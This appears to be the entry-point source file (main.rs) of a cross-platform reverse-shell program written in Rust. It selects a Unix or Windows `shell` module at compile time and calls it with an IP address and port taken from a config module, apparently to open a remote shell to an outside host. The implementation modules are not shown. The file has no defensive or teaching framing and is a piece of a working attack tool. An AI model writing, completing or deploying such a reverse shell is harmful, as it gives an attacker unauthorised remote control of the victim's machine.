// Load configuration values
mod config;

// Load the appropriate operating system's implementation
#[cfg(unix)]
mod unix_rs;
#[cfg(unix)]
use unix_rs::shell;

#[cfg(windows)]
extern crate windows;
#[cfg(windows)]
mod windows_rs;
#[cfg(windows)]
use windows_rs::shell;

fn main() {
    shell(config::IP, config::PORT);
}